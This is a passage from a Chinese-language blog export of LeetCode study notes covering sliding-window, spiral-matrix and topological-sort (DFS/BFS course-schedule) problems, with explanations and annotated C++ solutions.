    <url>/2023/09/07/%E5%8F%8C%E6%8C%87%E9%92%88-%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3/</url>
    <content><![CDATA[<h1 id="双指针-滑动窗口"><a href="#双指针-滑动窗口" class="headerlink" title="双指针-滑动窗口"></a>双指针-滑动窗口</h1><p><strong>思路：</strong>一个<code>for</code>循环中的<code>j</code>表示<strong>起始位置</strong>还是<strong>终止位置</strong>？</p>
<ul>
<li>起始位置：和暴力解法无区别，都要把元素遍历一遍</li>
<li>所以表示的是终止位置：<strong>关键如何移动起始位置？</strong></li>
</ul>
<h2 id="1-leetcode-209-长度最小的子数组"><a href="#1-leetcode-209-长度最小的子数组" class="headerlink" title="1.leetcode-209-长度最小的子数组"></a>1.leetcode-209-长度最小的子数组</h2><p>题目：<a href="https://leetcode.cn/problems/minimum-size-subarray-sum/description/">209. 长度最小的子数组 - 力扣（LeetCode）</a></p>
<p>返回满足条件最小子数组的长度。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//滑动窗口-for循环变量表示终止位置</span></span><br><span class="line"><span class="type">int</span> res = INT32_MAX, n = nums.<span class="built_in">size</span>();</span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>, start = <span class="number">0</span>, sublength = <span class="number">0</span>;<span class="comment">//初始化起始位置start，长度sublength</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">    sum += nums[i];<span class="comment">//更新总和</span></span><br><span class="line">    <span class="comment">//总和大于目标时</span></span><br><span class="line">    <span class="keyword">while</span> (sum &gt;= target)&#123;</span><br><span class="line">        sublength = i - start + <span class="number">1</span>;<span class="comment">//计算长度</span></span><br><span class="line">        res = <span class="built_in">min</span>(res, sublength);<span class="comment">//取长度最小值</span></span><br><span class="line">        sum = sum - nums[start];<span class="comment">//进行滑动</span></span><br><span class="line">        start++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> res == INT32_MAX ? <span class="number">0</span> : res;<span class="comment">//比较res是否有变换，没有则返回0</span></span><br></pre></td></tr></table></figure>





<h2 id="2-leetcode-904-水果成篮"><a href="#2-leetcode-904-水果成篮" class="headerlink" title="2.leetcode-904-水果成篮"></a>2.leetcode-904-水果成篮</h2><p>题目：<a href="https://leetcode.cn/problems/fruit-into-baskets/">904. 水果成篮 - 力扣（LeetCode）</a></p>
<p>思路：滑动窗口，并且用哈希表存储这个窗口的出现次数</p>
<p>每次将终止位置<code>i</code>移动一个位置，并将<code>fruits[i]</code>加入哈希表，**如果此时哈希表出现超过两个键对则不满足条件，需要不断移动<code>start</code>**，并将<code>fruits[start]</code>从哈希表中移除，直到满足要求。</p>
<p>如果<code>fruits[start]</code>出现次数为<code>0</code>，则要擦除键对。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> res = <span class="number">0</span>, n = fruits.<span class="built_in">size</span>();</span><br><span class="line"><span class="type">int</span> start = <span class="number">0</span>;</span><br><span class="line">unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; cnt;<span class="comment">//哈希表</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i)&#123;</span><br><span class="line">    ++cnt[fruits[i]];<span class="comment">//将出现次数记录在哈希表中</span></span><br><span class="line">    <span class="keyword">while</span>(cnt.<span class="built_in">size</span>() &gt; <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="comment">//哈希表中记录的种类大于两个</span></span><br><span class="line">        <span class="keyword">auto</span> it = cnt.<span class="built_in">find</span>(fruits[start]);</span><br><span class="line">        --it-&gt;second;<span class="comment">//减去值</span></span><br><span class="line">        <span class="keyword">if</span> (it-&gt;second == <span class="number">0</span>) &#123;</span><br><span class="line">            cnt.<span class="built_in">erase</span>(it);<span class="comment">//如果出现次数为零 则擦取键值</span></span><br><span class="line">        &#125;</span><br><span class="line">        ++start;</span><br><span class="line">    &#125;</span><br><span class="line">    res = <span class="built_in">max</span>(res, i - start + <span class="number">1</span>);<span class="comment">//计算步长</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br></pre></td></tr></table></figure>



<h2 id="3-leetcode-76-最小覆盖子串-hard"><a href="#3-leetcode-76-最小覆盖子串-hard" class="headerlink" title="3.leetcode-76-最小覆盖子串-hard"></a>3.leetcode-76-最小覆盖子串-hard</h2><p>题目：<a href="https://leetcode.cn/problems/minimum-window-substring/">76. 最小覆盖子串 - 力扣（LeetCode）</a></p>
<p>思路：用两个哈希表，一个<code>cntT</code>表示<code>t</code>中所有的字符以及他们的个数，另一个动态维护<code>s</code>中所有字符以及它们的个数，<strong>如果这个动态表<code>cntS</code>中包含所有<code>cntT</code>中所有的字符，且个数都不少于<code>t</code>哈希表的个数，</strong>则表示当前窗口时可行的，进行左区间的收缩。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">tring res = s + <span class="string">&quot;tt&quot;</span>;</span><br><span class="line"><span class="type">int</span> start = <span class="number">0</span>, count = <span class="number">0</span>, n = s.<span class="built_in">size</span>();</span><br><span class="line">unordered_map&lt;<span class="type">char</span>, <span class="type">int</span>&gt; cntS, cntT;<span class="comment">//哈希表创建</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">char</span> c : t) &#123;</span><br><span class="line">    ++cntT[c];<span class="comment">//统计t字串中的键对</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">    ++cntS[s[i]];<span class="comment">//动态哈希表</span></span><br><span class="line">    <span class="keyword">if</span> (cntT[s[i]] &gt;= cntS[s[i]])&#123;</span><br><span class="line">        <span class="comment">//如果当前T中哈希表大于等于动态哈希表，则说明s[i]字符的数量没有冗余，可以有效增加，若当前字符的出现个数大于t中的个数则出现冗余，不可以增加</span></span><br><span class="line">        ++count;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (start &lt; i &amp;&amp; cntS[s[start]] &gt; cntT[s[start]])&#123;</span><br><span class="line">        <span class="comment">//进行start迭代，当start对应的字符是冗余的即多余目标字符个数</span></span><br><span class="line">        --cntS[s[start]];<span class="comment">//进行数量减少</span></span><br><span class="line">        start++;<span class="comment">//自增</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (count == t.<span class="built_in">size</span>()) &#123;</span><br><span class="line">        <span class="comment">//当窗口以满足所有目标字符串大小则进行区间判断和截取</span></span><br><span class="line">        <span class="keyword">if</span> (i - start + <span class="number">1</span> &lt; res.<span class="built_in">size</span>())</span><br><span class="line">            res = s.<span class="built_in">substr</span>(start, i - start + <span class="number">1</span>);<span class="comment">//小区间迭代</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res == s + <span class="string">&quot;tt&quot;</span> ? <span class="string">&quot;&quot;</span> : res;<span class="comment">//比较</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>基础算法</category>
      </categories>
      <tags>
        <tag>数组</tag>
        <tag>双指针</tag>
        <tag>滑动窗口</tag>
      </tags>
  </entry>
  <entry>
    <title>螺旋矩阵</title>
    <url>/2023/09/08/%E8%9E%BA%E6%97%8B%E7%9F%A9%E9%98%B5/</url>
    <content><![CDATA[<h1 id="螺旋矩阵"><a href="#螺旋矩阵" class="headerlink" title="螺旋矩阵"></a>螺旋矩阵</h1><p>思路： 循环不变量—–分清楚区间左闭右开 还是左闭右闭</p>
<h2 id="1-leetcode-59-螺旋矩阵"><a href="#1-leetcode-59-螺旋矩阵" class="headerlink" title="1.leetcode-59-螺旋矩阵"></a>1.leetcode-59-螺旋矩阵</h2><p>题目：<a href="https://leetcode.cn/problems/spiral-matrix-ii/">59. 螺旋矩阵 II - 力扣（LeetCode）</a></p>
<p>坚持循环不变量–左闭右开</p>
<p><img src="/2023/09/08/%E8%9E%BA%E6%97%8B%E7%9F%A9%E9%98%B5/image-20230908103353646.png" alt="image-20230908103353646"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">res</span>(n,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n,<span class="number">0</span>));</span><br><span class="line"><span class="type">int</span> startx = <span class="number">0</span>, starty = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> loop = n / <span class="number">2</span>; <span class="comment">// 每个圈循环几次，例如n为奇数3，那么loop = 1 只是循环一圈，矩阵中间的值需要单独处理</span></span><br><span class="line"><span class="type">int</span> mid = n / <span class="number">2</span>; <span class="comment">// 矩阵中间的位置，例如：n为3， 中间的位置就是(1，1)，n为5，中间位置为(2, 2)</span></span><br><span class="line"><span class="type">int</span> count = <span class="number">1</span>; <span class="comment">// 用来给矩阵中每一个空格赋值</span></span><br><span class="line"><span class="type">int</span> offset = <span class="number">1</span>; <span class="comment">// 需要控制每一条边遍历的长度，每次循环右边界收缩一位</span></span><br><span class="line"><span class="type">int</span> i,j;</span><br><span class="line"><span class="keyword">while</span> (loop --) &#123;</span><br><span class="line">    i = startx;</span><br><span class="line">    j = starty;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 下面开始的四个for就是模拟转了一圈</span></span><br><span class="line">    <span class="comment">// 模拟填充上行从左到右(左闭右开)</span></span><br><span class="line">    <span class="keyword">for</span> (j = starty; j &lt; n - offset; j++) &#123;</span><br><span class="line">        res[startx][j] = count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 模拟填充右列从上到下(左闭右开)</span></span><br><span class="line">    <span class="keyword">for</span> (i = startx; i &lt; n - offset; i++) &#123;</span><br><span class="line">        res[i][j] = count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 模拟填充下行从右到左(左闭右开)</span></span><br><span class="line">    <span class="keyword">for</span> (; j &gt; starty; j--) &#123;</span><br><span class="line">        res[i][j] = count++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 模拟填充左列从下到上(左闭右开)</span></span><br><span class="line">    <span class="keyword">for</span> (; i &gt; startx; i--) &#123;</span><br><span class="line">        res[i][j] = count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第二圈开始的时候，起始位置要各自加1， 例如：第一圈起始位置是(0, 0)，第二圈起始位置是(1, 1)</span></span><br><span class="line">    startx++;</span><br><span class="line">    starty++;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// offset 控制每一圈里每一条边遍历的长度</span></span><br><span class="line">    offset += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果n为奇数的话，需要单独给矩阵最中间的位置赋值</span></span><br><span class="line"><span class="keyword">if</span> (n % <span class="number">2</span>) &#123;</span><br><span class="line">    res[mid][mid] = count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br></pre></td></tr></table></figure>





<h2 id="2-leetcode-54-螺旋矩阵"><a href="#2-leetcode-54-螺旋矩阵" class="headerlink" title="2.leetcode-54-螺旋矩阵"></a>2.leetcode-54-螺旋矩阵</h2><p>题目：<a href="https://leetcode.cn/problems/spiral-matrix/">54. 螺旋矩阵 - 力扣（LeetCode）</a>、<a href="https://leetcode.cn/problems/shun-shi-zhen-da-yin-ju-zhen-lcof/description/">剑指 Offer 29. 顺时针打印矩阵 - 力扣（LeetCode）</a></p>
<p>思路：<strong>不断定义上下左右边界</strong> </p>
<p>题解：<a href="https://leetcode.cn/problems/spiral-matrix/solutions/7155/cxiang-xi-ti-jie-by-youlookdeliciousc-3/">54. 螺旋矩阵 - 力扣（LeetCode）</a>    THX！！！</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector &lt;<span class="type">int</span>&gt; ans;</span><br><span class="line"><span class="keyword">if</span>(matrix.<span class="built_in">empty</span>()) <span class="keyword">return</span> ans; <span class="comment">//若数组为空，直接返回答案</span></span><br><span class="line"><span class="type">int</span> upper = <span class="number">0</span>; <span class="comment">//赋值上下左右边界</span></span><br><span class="line"><span class="type">int</span> down = matrix.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line"><span class="type">int</span> left = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> right = matrix[<span class="number">0</span>].<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = left; i &lt;= right; ++i) ans.<span class="built_in">push_back</span>(matrix[upper][i]); <span class="comment">//向右移动直到最右</span></span><br><span class="line">    <span class="keyword">if</span>(++ upper &gt; down) <span class="keyword">break</span>; <span class="comment">//重新设定上边界，若上边界大于下边界，则遍历遍历完成，下同</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = upper; i &lt;= down; ++i) ans.<span class="built_in">push_back</span>(matrix[i][right]); <span class="comment">//向下</span></span><br><span class="line">    <span class="keyword">if</span>(-- right &lt; left) <span class="keyword">break</span>; <span class="comment">//重新设定右边界</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = right; i &gt;= left; --i) ans.<span class="built_in">push_back</span>(matrix[down][i]); <span class="comment">//向左</span></span><br><span class="line">    <span class="keyword">if</span>(-- down &lt; upper) <span class="keyword">break</span>; <span class="comment">//重新设定下边界</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = down; i &gt;= upper; --i) ans.<span class="built_in">push_back</span>(matrix[i][left]); <span class="comment">//向上</span></span><br><span class="line">    <span class="keyword">if</span>(++ left &gt; right) <span class="keyword">break</span>; <span class="comment">//重新设定左边界</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ans;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>基础算法</category>
      </categories>
      <tags>
        <tag>螺旋矩阵</tag>
        <tag>循环</tag>
        <tag>边界确定</tag>
      </tags>
  </entry>
  <entry>
    <title>BFS和DFSleetcode汇总</title>
    <url>/2023/09/09/BFS%E5%92%8CDFSleetcode%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h1 id="BFS-DFS"><a href="#BFS-DFS" class="headerlink" title="BFS&amp;DFS"></a>BFS&amp;DFS</h1><p><strong>思路：</strong>构建拓扑序列+深度优先或广度优先</p>
<h2 id="1-leetcode-207-课程表"><a href="#1-leetcode-207-课程表" class="headerlink" title="1.leetcode-207-课程表"></a>1.leetcode-207-课程表</h2><p>题目：<a href="https://leetcode.cn/problems/course-schedule/description/?envType=daily-question&envId=2023-09-09">207. 课程表 - 力扣（LeetCode）</a></p>
<p>题解：<a href="https://leetcode.cn/problems/course-schedule/solutions/359392/ke-cheng-biao-by-leetcode-solution/?envType=daily-question&envId=2023-09-09">207. 课程表 - 力扣（LeetCode）</a></p>
<p><strong>有向图思路：</strong></p>
<ol>
<li>可以用有向图来表示课程间的拓扑关系，用箭头来表示课程之间的修习关系</li>
<li>显然的可以从有向图中得出结论，若图中存在环，则图不存在拓扑排序，无法满足：对于图<code> G</code> 中的任意一条有向边 <code>(u,v)</code>，<code>u</code>在排列中都出现在 <code>v</code> 的前面。因此也不存在一个满足要求的排列。</li>
<li>如果图<code>G</code>是有向无环图，那么它的拓扑排列可能都不止一种。图<code>G</code>包含<code>n</code>个节点却没有任何的边，那么任意一种编号的排列都可以作为拓扑排列。</li>
</ol>
<p><strong>本题思路：</strong></p>
<ul>
<li>将每一门课看作一个节点，</li>
<li>如果想要学习<code>课程A</code>之前必须完成<code>课程B</code>，那么我们从<code>B</code>到<code>A</code>连接一条有向边。这样以来，在拓扑排序中，<code>B</code>一定出现在<code>A</code>的前面。</li>
</ul>
<h3 id="1-1DFS"><a href="#1-1DFS" class="headerlink" title="1.1DFS"></a>1.1DFS</h3><p>对于图中的任意一个节点，它在搜索的过程中有三种状态，即：</p>
<ul>
<li><code>「未搜索」</code>：我们还没有搜索到这个节点；</li>
<li><code>「搜索中」</code>：我们搜索过这个节点，但还没有回溯到该节点，<strong>即该节点还没有入栈，还有相邻的节点没有搜索完成</strong>；</li>
<li><code>「已完成」</code>：我们搜索过并且回溯过这个节点，<strong>即该节点已经入栈，并且所有该节点的相邻节点都出现在栈的更底部的位置，满足拓扑排序的要求。</strong></li>
</ul>
<p>通过上述的三种状态，我们就可以给出使用深度优先搜索得到拓扑排序的算法流程，在每一轮的搜索搜索开始时，我们任取一个<code>「未搜索」</code>的节点开始进行深度优先搜索。</p>
<ul>
<li><p>我们将当前搜索的节点 <code>u</code> 标记为<code>「搜索中」</code>，遍历该节点的每一个相邻节点 <code>v</code>：</p>
<p>如果 <code>v</code> 为<code>「未搜索」</code>，那么我们开始搜索 <code>v</code>，待搜索完成回溯到 <code>u</code>；</p>
<p>如果 <code>v</code>为<code>「搜索中」</code>，<strong>那么我们就找到了图中的一个环</strong>，因此是不存在拓扑排序的；</p>
<p>如果 <code>v</code> 为<code>「已完成」</code>，那么说明 <code>v</code>已经在栈中了，而 <code>u</code> 还不在栈中，因此 <code>u </code>无论何时入栈都不会影响到 <code>(u,v)</code> 之前的拓扑关系，以及不用进行任何操作。</p>
</li>
<li><p>当 <code>u</code>的所有相邻节点都为<code>「已完成」</code>时，我们将<code> u</code> 放入栈中，并将其标记为<code>「已完成」</code>。</p>
</li>
</ul>
<p>在整个深度优先搜索的过程结束后，<strong>如果我们没有找到图中的环，那么栈中存储这所有的 <code>n</code> 个节点，从栈顶到栈底的顺序即为一种拓扑排序。</strong></p>
<p><img src="/2023/09/09/BFS%E5%92%8CDFSleetcode%E6%B1%87%E6%80%BB/image-20230909153850172.png" alt="image-20230909153850172"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; edges;<span class="comment">//用于表示课程之间的依赖关系，edge[u]表示课程u是哪些课程的先修课程列表</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; visited;<span class="comment">//用于标记课程的访问状态，0表示未访问，1表示正在访问，2表示已经访问</span></span><br><span class="line">    <span class="type">bool</span> valid = <span class="literal">true</span>;<span class="comment">//返回值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//深度优先搜索函数，用于检查是否存在环，u表示正在访问的课程</span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(<span class="type">int</span> u)</span> </span>&#123;</span><br><span class="line">        visited[u] = <span class="number">1</span>;<span class="comment">//设为1，表示正在访问该课程</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> v: edges[u]) &#123;<span class="comment">//遍历u的先修列表edge[u]的课程v</span></span><br><span class="line">            <span class="keyword">if</span> (visited[v] == <span class="number">0</span>) &#123;<span class="comment">//如果v没有被访问过则递归调用搜索先修课程v</span></span><br><span class="line">                <span class="built_in">dfs</span>(v);</span><br><span class="line">                <span class="keyword">if</span> (!valid) &#123;</span><br><span class="line">                    <span class="keyword">return</span>;<span class="comment">//发现了环，直接返回</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (visited[v] == <span class="number">1</span>) &#123;<span class="comment">//如果v已经被访问过，则表示存在环</span></span><br><span class="line">                valid = <span class="literal">false</span>;<span class="comment">//设置为false</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        visited[u] = <span class="number">2</span>;<span class="comment">//标记为2 表示已经访问完毕</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">canFinish</span><span class="params">(<span class="type">int</span> numCourses, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; prerequisites)</span> </span>&#123;</span><br><span class="line">        edges.<span class="built_in">resize</span>(numCourses);</span><br><span class="line">        visited.<span class="built_in">resize</span>(numCourses);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; info: prerequisites) &#123;</span><br><span class="line">            edges[info[<span class="number">1</span>]].<span class="built_in">push_back</span>(info[<span class="number">0</span>]);<span class="comment">//构建有向图</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; numCourses &amp;&amp; valid; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!visited[i]) &#123;</span><br><span class="line">                <span class="built_in">dfs</span>(i);<span class="comment">//遍历所有课程，如果存在课程尚未被访问则调用dfs</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> valid;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>





<h3 id="1-2BFS"><a href="#1-2BFS" class="headerlink" title="1.2BFS"></a>1.2BFS</h3><p>DFS是<strong>逆向思维</strong>，所以可以<strong>使用BFS来正向的考虑</strong>拓扑排序中最前面的节点，即没有入度的节点。</p>
<p><strong>当我们将一个节点加入答案中后，我们就可以移除它的所有出边，代表着它的相邻节点少了一门先修课程的要求。如果某个相邻节点变成了<code>「没有任何入边的节点」</code>，那么就代表着这门课可以开始学习了。</strong>按照这样的流程，我们不断地将没有入边的节点加入答案，直到答案中包含所有的节点（得到了一种拓扑排序）或者不存在没有入边的节点（图中包含环）。</p>
<p><strong>算法设计：</strong></p>
<p>我们使用一个队列来进行广度优先搜索。初始时，所有<code>入度为 0</code> 的节点都被放入队列中，<strong>它们就是可以作为拓扑排序最前面的节点，并且它们之间的相对顺序是无关紧要的。</strong></p>
<p>在广度优先搜索的每一步中，我们取出队首的<code>节点 u</code>：</p>
<ul>
<li><p>我们将<code>u</code>放入答案中；</p>
</li>
<li><p>我们移除 <code>u</code> 的所有出边，也就是将 <code>u</code> 的所有相邻节点的<code>入度减少 1</code>。如果某个相邻节点 <code>v</code>的入度变为<code> 0</code>，那么我们就将 <code>v</code>放入队列中。</p>
</li>
</ul>
<p>在广度优先搜索的过程结束后。如果答案中包含了这 <code>n</code> 个节点，那么我们就找到了一种拓扑排序，否则说明图中存在环，也就不存在拓扑排序了。\</p>
<p><img src="/2023/09/09/BFS%E5%92%8CDFSleetcode%E6%B1%87%E6%80%BB/image-20230909161315935.png" alt="image-20230909161315935"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; edges;<span class="comment">//边的依赖关系，edge[u]表示u作为了多少其他课程的先修课程</span></span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; indeg;<span class="comment">//表示每个课程的入度</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">canFinish</span><span class="params">(<span class="type">int</span> numCourses, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; prerequisites)</span> </span>&#123;</span><br><span class="line">        edges.<span class="built_in">resize</span>(numCourses);</span><br><span class="line">        indeg.<span class="built_in">resize</span>(numCourses);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">const</span> <span class="keyword">auto</span>&amp; info: prerequisites) &#123;</span><br><span class="line">            edges[info[<span class="number">1</span>]].<span class="built_in">push_back</span>(info[<span class="number">0</span>]);<span class="comment">//有向图的构建</span></span><br><span class="line">            ++indeg[info[<span class="number">0</span>]];<span class="comment">//入度</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        queue&lt;<span class="type">int</span>&gt; q;<span class="comment">//创建一个拓扑排序</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; numCourses; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (indeg[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                q.<span class="built_in">push</span>(i);<span class="comment">//如果入度为0，则将该课程加入队列，表示这个课程可以直接学习</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> visited = <span class="number">0</span>;<span class="comment">//用于表示已访问过的课程数量</span></span><br><span class="line">        <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            ++visited;</span><br><span class="line">            <span class="type">int</span> u = q.<span class="built_in">front</span>();<span class="comment">//每次从队列中取出一个课程</span></span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> v: edges[u]) &#123;</span><br><span class="line">                --indeg[v];<span class="comment">//遍历u作为先修课程，减少v的入度</span></span><br><span class="line">                <span class="keyword">if</span> (indeg[v] == <span class="number">0</span>) &#123;</span><br><span class="line">                    q.<span class="built_in">push</span>(v);<span class="comment">//如果v的入度变为了0，则加入队列</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> visited == numCourses;<span class="comment">//判断是否所有课程都已经学完</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h2 id="2-leetcode-1462-课程表Ⅳ"><a href="#2-leetcode-1462-课程表Ⅳ" class="headerlink" title="2.leetcode-1462-课程表Ⅳ"></a>2.leetcode-1462-课程表Ⅳ</h2><p><strong>题目：</strong><a href="https://leetcode.cn/problems/course-schedule-iv/description/?envType=daily-question&envId=2023-09-12">1462. 课程表 IV - 力扣（LeetCode）</a></p>
<p><strong>题解：</strong><a href="https://leetcode.cn/problems/course-schedule-iv/?envType=daily-question&envId=2023-09-12">1462. 课程表 IV - 力扣（LeetCode）</a></p>
<p><strong>代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">checkIfPrerequisite</span><span class="params">(<span class="type">int</span> numCourses, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; prerequisites, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; queries)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">g</span>(numCourses);<span class="comment">//用于表示课程之间的图，g[i]存储了i的后继课程</span></span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">indgree</span><span class="params">(numCourses, <span class="number">0</span>)</span></span>;<span class="comment">//入度</span></span><br><span class="line">        vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">isPre</span>(numCourses, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(numCourses, <span class="literal">false</span>));<span class="comment">//表示课程x是否是课程y的先决条件</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; p : prerequisites) &#123;</span><br><span class="line">            ++indgree[p[<span class="number">1</span>]];<span class="comment">//图的建立</span></span><br><span class="line">            g[p[<span class="number">0</span>]].<span class="built_in">push_back</span>(p[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; numCourses; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (indgree[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                q.<span class="built_in">push</span>(i);<span class="comment">//将度为0的课程加入</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//bfs</span></span><br><span class="line">        <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">auto</span> cur = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; ne : g[cur]) &#123;<span class="comment">//遍历g[cur]中的每个直接后继课程</span></span><br><span class="line">                isPre[cur][ne] = <span class="literal">true</span>;<span class="comment">//置为true</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; numCourses; ++i) &#123;</span><br><span class="line">                    isPre[i][ne] = isPre[i][ne] | isPre[i][cur];</span><br><span class="line">                &#125;</span><br><span class="line">                --indgree[ne];<span class="comment">//减少入度</span></span><br><span class="line">                <span class="keyword">if</span> (indgree[ne] == <span class="number">0</span>) &#123;</span><br><span class="line">                    q.<span class="built_in">push</span>(ne);<span class="comment">//如果度为0 加入队列进行下一轮处理</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//完成拓扑排序后，ispre含有了所有课程之间的先决条件关系</span></span><br><span class="line">        vector&lt;<span class="type">bool</span>&gt; res;<span class="comment">//用于存储所有查询结果</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; query : queries) &#123;</span><br><span class="line">            <span class="comment">//遍历每个查询，存储结果</span></span><br><span class="line">            res.<span class="built_in">push_back</span>(isPre[query[<span class="number">0</span>]][query[<span class="number">1</span>]]);</span><br><span class="line">        &#125;</span><br><span class="line">        